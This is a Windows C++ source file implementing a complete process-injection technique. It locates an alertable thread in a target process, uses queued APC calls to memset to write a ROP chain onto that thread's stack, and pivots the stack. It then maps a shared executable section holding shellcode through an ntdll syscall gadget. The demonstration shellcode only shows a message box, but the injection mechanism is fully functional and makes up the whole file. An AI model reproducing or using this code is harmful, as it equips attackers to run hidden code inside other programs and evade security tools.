#include <stdio.h>
#include <Windows.h>
#include <tlhelp32.h>

/*

using ZwMapViewOfSection = NTSTATUS(NTAPI*)(

	IN HANDLE               SectionHandle,
	IN HANDLE               ProcessHandle,
	IN OUT PVOID * BaseAddress OPTIONAL,
	IN ULONG                ZeroBits OPTIONAL,
	IN ULONG                CommitSize,
	IN OUT PLARGE_INTEGER   SectionOffset OPTIONAL,
	IN OUT PULONG           ViewSize,
	IN DWORD                InheritDisposition,
	IN ULONG                AllocationType OPTIONAL,
	IN ULONG                Protect);

	*/

using NtQueueApcThread = NTSTATUS(NTAPI*)(
	IN HANDLE ThreadHandle,
	IN PVOID ApcRoutine,
	IN PVOID SystemArgument1 OPTIONAL,
	IN PVOID SystemArgument2 OPTIONAL,
	IN INT64 SystemArgument3 OPTIONAL
	);

struct THREAD_DATA {
	DWORD threadId;
	DWORD processId;
	HANDLE hThread;
	HANDLE hProcess;
	CONTEXT ctx;

	BYTE* payload;
	DWORD payloadSize;

	LPVOID oldRSP;
	LPVOID newRSP;



	HANDLE hRemoteSection;

	PDWORD64 ROP;
	DWORD ROPSize;
	DWORD64 pivotGadget;
	DWORD64 ROPreturnAddress;

};

void* memmem(const void* haystack, size_t haystack_len, const void* needle, size_t needle_len)
{
	if (haystack == NULL) return NULL;
	if (haystack_len == 0) return NULL;
	if (needle == NULL) return NULL;
	if (needle_len == 0) return NULL;

	for (const char* h = (char*)haystack; haystack_len >= needle_len; h++, haystack_len--) {
		if (!memcmp(h, needle, needle_len)) {
			return (void*)h;
		}
	}
	return NULL;
}

DWORD findAlertableThread(THREAD_DATA* threadData) {
	THREADENTRY32 thread32 = { sizeof(THREADENTRY32) };
	HANDLE targetProcessThreadArray[MAXIMUM_WAIT_OBJECTS], threadHandle;
	HANDLE threadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, threadData->processId);
	DWORD threadCount = 0;
	if (!Thread32First(threadSnapshot, &thread32)) {
		printf("Error: coudn't get first thread from process snapshot (%d)\n", GetLastError());
		return 0;
	}
	do
	{
		if (thread32.th32OwnerProcessID != threadData->processId) continue;
		threadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, thread32.th32ThreadID);
		if (threadHandle != INVALID_HANDLE_VALUE && threadHandle != NULL) {
			targetProcessThreadArray[threadCount] = threadHandle;
		}
		threadCount++;
		if (threadCount == MAXIMUM_WAIT_OBJECTS) {
			break;
		}
	} while (Thread32Next(threadSnapshot, &thread32));
	CloseHandle(threadHandle);

	// Creating Events
	HANDLE hEvents[MAXIMUM_WAIT_OBJECTS];
	for (DWORD i = 0; i < threadCount; i++) {
		hEvents[i] = CreateEvent(NULL, FALSE, FALSE, NULL);
	}

	// Duplicating Handles to Events Objects (to remote thread)
	HANDLE hTargetEvents[MAXIMUM_WAIT_OBJECTS];
	for (DWORD i = 0; i < threadCount; i++) {
		DuplicateHandle(GetCurrentProcess(), hEvents[i], threadData->hProcess, &hTargetEvents[i], 0, FALSE, DUPLICATE_SAME_ACCESS);
	}

	for (DWORD i = 0; i < threadCount; i++) {
		QueueUserAPC((PAPCFUNC)&SetEvent, targetProcessThreadArray[i], (ULONG_PTR)hTargetEvents[i]);
	}

	DWORD tEvent = WaitForMultipleObjects(threadCount, hEvents, FALSE, 10000);

	// Get Alertable Thread by event that was signaled

	if (tEvent != WAIT_TIMEOUT) {
		threadData->hThread = targetProcessThreadArray[tEvent];
	}
	for (DWORD i = 0; i < threadCount; i++) {
		DuplicateHandle(threadData->hProcess, hTargetEvents[i], GetCurrentProcess(), &hEvents[i], 0, FALSE, DUPLICATE_CLOSE_SOURCE);
		CloseHandle(hEvents[i]);
		if (targetProcessThreadArray[i] != threadData->hThread) {
			CloseHandle(targetProcessThreadArray[i]);
		}
	}
	CloseHandle(threadSnapshot);
	return 1;
}

LPVOID CreateMappedSection(THREAD_DATA* threadData) {
	HANDLE hLocalSection = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, threadData->payloadSize, NULL);
	LPVOID address = MapViewOfFile(hLocalSection, FILE_MAP_READ | FILE_MAP_WRITE, NULL, NULL, NULL);
	DuplicateHandle(GetCurrentProcess(), hLocalSection, threadData->hProcess, &threadData->hRemoteSection, 0, 0, DUPLICATE_SAME_ACCESS);
	CloseHandle(hLocalSection);
	return address;
}

void CreatePayload(THREAD_DATA* threadData) {

	BYTE payload[] = {
		/*0: */			0x48, 0xB8, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,	// movabs  rax, 0x1111111111111111
		/*a: */			0x50,								// push rax
		/*b: */			0x49, 0x89, 0xe0, 						// mov r8, rsp
		/*e: */			0x48, 0xB8, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,	// movabs  rax, 0x2222222222222222
		/*19: */		0x50,								// push rax
		/*1a: */		0x48, 0x89, 0xe2, 						// mov rdx, rsp
		/*1d: */		0x48, 0x31, 0xC9,						// xor rcx, rcx
		/*20: */		0x4D, 0x31, 0xC9,						// xor r9, r9
		/*23: */		0x48, 0x83, 0xEC, 0x28,						// sub rsp, 0x28
		/*27: */		0x48, 0xB8, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33,	// movabs  rax, 0x3333333333333333
		/*31: */		0xFF, 0xD0,							// call rax
		/*33: */		0x48, 0x83, 0xC4, 0x38,						// add rsp, 0x38
		/*37: */		0x48, 0x31, 0xc0,						// xor rax, rax
		/*3a: */		0xC3,								// ret
		 };


	threadData->payload = payload;
	threadData->payloadSize = sizeof(payload);

	HMODULE hntdll = LoadLibraryA("user32");
	PVOID hMessageBoxA = (PVOID)GetProcAddress(hntdll, "MessageBoxA");

	char text[8] = "H3lLo!";
	char caption[8] = "W0rLd!";

	DWORD64 bytesWritten = 0;
	LPVOID address = CreateMappedSection(threadData);
	memcpy(address, payload, sizeof(payload));
	memcpy((memmem(address, sizeof(payload), "\x11\x11\x11\x11\x11\x11\x11\x11", 8)),text, 8);
	memcpy((memmem(address, sizeof(payload), "\x22\x22\x22\x22\x22\x22\x22\x22", 8)), caption, 8);
	memcpy(memmem(address, sizeof(payload), "\x33\x33\x33\x33\x33\x33\x33\x33", 8), &hMessageBoxA, 8);
	UnmapViewOfFile(address);


}

DWORD64 SearchRopGadgets(const void* ropGadget, size_t ropGadgetSize) {
	DWORD i = 0;
	HMODULE hModuleNtdll = GetModuleHandle(L"ntdll");
	PIMAGE_DOS_HEADER imageDosHeader = (PIMAGE_DOS_HEADER)hModuleNtdll;
	PIMAGE_NT_HEADERS imageNtHeaders = (PIMAGE_NT_HEADERS)((DWORD64)hModuleNtdll + imageDosHeader->e_lfanew);
	PIMAGE_SECTION_HEADER imageSectionHeader = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(imageNtHeaders);

	DWORD numberOfSections = imageNtHeaders->FileHeader.NumberOfSections;

	for (i = 0; i < numberOfSections; i++) {
		if (lstrcmp((LPCWSTR)imageSectionHeader->Name, L".text")) break;
	}

	DWORD64 ropGadgetAddress = (DWORD64)memmem((char*)imageSectionHeader, imageSectionHeader->SizeOfRawData, ropGadget, ropGadgetSize);

	if (ropGadgetAddress != NULL) return ropGadgetAddress;

	CloseHandle(hModuleNtdll);
	return NULL;
}

VOID CreateROP(THREAD_DATA* threadData) {

	DWORD64 *ROP = (DWORD64*)malloc(100 * sizeof(DWORD64));
	DWORD count = 0;
	HMODULE hModuleNtdll = GetModuleHandle(L"ntdll");
	DWORD64 popregs = SearchRopGadgets("\x58\x5A\x59\x41\x58\x41\x59\x41\x5A\x41\x5B\xC3", 12); /*	0:  58                  pop    rax
													1:  5a                  pop    rdx
													2:  59                  pop    rcx
													3:  41 58               pop    r8
													5:  41 59               pop    r9
													7:  41 5a               pop    r10
													9:  41 5b               pop    r11
													10: c3			ret	*/
	DWORD64 syscall = (DWORD64)GetProcAddress((HMODULE)hModuleNtdll, "NtYieldExecution") + 0x12;

	DWORD64 pivotGadget = SearchRopGadgets("\x5C\xC3", 2); /*	0: 5c	pop rsp
									1: c3	ret*/

	DWORD64 add28 = SearchRopGadgets("\x48\x83\xC4\x28\xC3", 5); /*	0: add rsp, 0x28
									1: ret*/
	DWORD64 add58 = SearchRopGadgets("\x48\x83\xC4\x58\xC3", 5); /*	0: add rsp, 0x58
									1: ret*/

	DWORD64 ret = SearchRopGadgets("\xC3", 1);

	DWORD64 memmove = (DWORD64)GetProcAddress((HMODULE)hModuleNtdll, "memmove");

	if (((DWORD64)threadData->newRSP + 11 * sizeof(DWORD64)) & 0xF)
	{
		ROP[count++] = ret;
	}

	ROP[count++] = popregs;
	ROP[count++] = 0x28;
	ROP[count++] = -1;
	ROP[count++] = (DWORD64)threadData->hRemoteSection;
	DWORD64 payloadAddress = count++;
	ROP[count++] = NULL;
	ROP[count++] = (DWORD64)threadData->hRemoteSection;
	ROP[count++] = NULL;

	ROP[count++] = syscall;

	ROP[count++] = add58;
	ROP[count++] = NULL;
	ROP[count++] = NULL;
	ROP[count++] = NULL;
	ROP[count++] = NULL;
	ROP[count++] = 0;
	ROP[count++] = NULL;
	DWORD64 ViewSize = count++;
	ROP[count++] = 2;
	ROP[count++] = 0x100000;
	ROP[count++] = PAGE_EXECUTE_READ;
	ROP[count++] = NULL;
	

	ROP[payloadAddress] = (DWORD64)threadData->newRSP + sizeof(DWORD64) * count;
	ROP[count++] = NULL;
	
	ROP[count++] = popregs;
	ROP[count++] = NULL;
	DWORD64 ROPreturnAddress = count++;
	ROP[count++] = (DWORD64)threadData->oldRSP;
	ROP[count++] = 8;
	ROP[count++] = NULL;
	ROP[count++] = NULL;
	ROP[count++] = NULL;

	ROP[count++] = memmove;

	ROP[count++] = add28;
	ROP[count++] = NULL;
	ROP[count++] = NULL;
	ROP[count++] = NULL;
	ROP[count++] = NULL;
	ROP[count++] = NULL;

	ROP[count++] = pivotGadget;
	ROP[count++] = (DWORD64)threadData->oldRSP;

	ROP[ViewSize] = (DWORD64)threadData->newRSP + sizeof(DWORD64) * count;
	ROP[count++] = threadData->payloadSize;

	ROP[ROPreturnAddress] = (DWORD64)threadData->newRSP + sizeof(DWORD64) * count;
	ROP[count++] = NULL;

	threadData->ROP = ROP;
	threadData->ROPSize = count;
	threadData->pivotGadget = pivotGadget;
	threadData->ROPreturnAddress = ROPreturnAddress;

}

#define PROCESS_ID 6764

int main() {
	
	THREAD_DATA* threadData = (THREAD_DATA*)malloc(sizeof(THREAD_DATA));
	threadData->processId = PROCESS_ID;
	threadData->hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, threadData->processId);

	CreatePayload(threadData);

	if (!findAlertableThread(threadData)) {
		return 0;
	}
	threadData->threadId = GetThreadId(threadData->hThread);

	SuspendThread(threadData->hThread);
	GetThreadContext(threadData->hThread, &threadData->ctx);
	threadData->oldRSP = (LPVOID)threadData->ctx.Rsp;
	threadData->newRSP = (LPVOID)((DWORD64)threadData->ctx.Rsp - 0x2000);
	CreateROP(threadData);

	HMODULE hModuleNtdll = GetModuleHandle(L"ntdll");
	NtQueueApcThread fpNtQueueApcThread = (NtQueueApcThread)GetProcAddress((HMODULE)hModuleNtdll, "NtQueueApcThread");

	for (DWORD64 i = (DWORD64)threadData->oldRSP - 0x1000; i >= (DWORD64)threadData->newRSP; i -= 1) {
		fpNtQueueApcThread(threadData->hThread, GetProcAddress((HMODULE)hModuleNtdll, "memset"), (PVOID)i, (PVOID)0, 1);
	}
	for (int i = 0; i < threadData->ROPSize * sizeof(DWORD64); i++) {
		fpNtQueueApcThread(threadData->hThread, GetProcAddress((HMODULE)hModuleNtdll, "memset"), (PVOID)((DWORD64)threadData->newRSP+i), (PVOID*)*((BYTE *)threadData->ROP+i), 1);
	}
	
	fpNtQueueApcThread(threadData->hThread, GetProcAddress((HMODULE)hModuleNtdll, "memmove"), (PVOID)(threadData->ROP[threadData->ROPreturnAddress]), threadData->oldRSP, 8);
	
	for (int i = 0; i < 8; i++) {
		fpNtQueueApcThread(threadData->hThread, GetProcAddress((HMODULE)hModuleNtdll, "memset"), (PVOID)((DWORD64)threadData->oldRSP + i), (PVOID)*((BYTE*)&threadData->pivotGadget+i), 1);
	}
	
	for (int i = 0; i < 8; i++) {
		fpNtQueueApcThread(threadData->hThread, GetProcAddress((HMODULE)hModuleNtdll, "memset"), (PVOID)((DWORD64)threadData->oldRSP + 8 + i), (PVOID)*((BYTE*)&threadData->newRSP+i), 1);
	}


	ResumeThread(threadData->hThread);


	CloseHandle(threadData->hThread);
	CloseHandle(threadData->hProcess);
	return 0;
}
